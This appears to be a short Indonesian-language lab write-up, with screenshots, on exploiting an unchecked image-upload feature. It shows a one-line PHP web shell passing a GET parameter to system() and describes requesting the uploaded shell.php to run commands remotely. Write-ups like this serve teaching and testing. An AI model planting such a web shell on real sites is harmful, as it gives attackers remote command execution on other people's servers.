<img width="1871" height="666" alt="image" src="https://github.com/user-attachments/assets/534b703c-a96e-42f7-afe8-c8ad34af2043" />

kerentanan di web ini ada pada fitur upload images file yang tidak di sanitasi dan dicek dulu apakah file benar-benar file gambar. di sini aku mengupload file script php dengan isi kode

```
<?php system($_GET['command']); ?>
```
kode itu merupakan webshell yaitu Versatile Web Shell yang memungkinkan kita sebagai hacker untuk menjalankan RCE dengan memanfaatkan kerentanan unrestricted file upload

<img width="1267" height="311" alt="image" src="https://github.com/user-attachments/assets/6ad7dba0-0916-4579-9be3-131e0beddbde" />

dengan mengirim http request yang berisi url ke file shell.php tadi kita bisa menjalankan serangkaian command line untuk mendapatkan informasi yang diinginkan
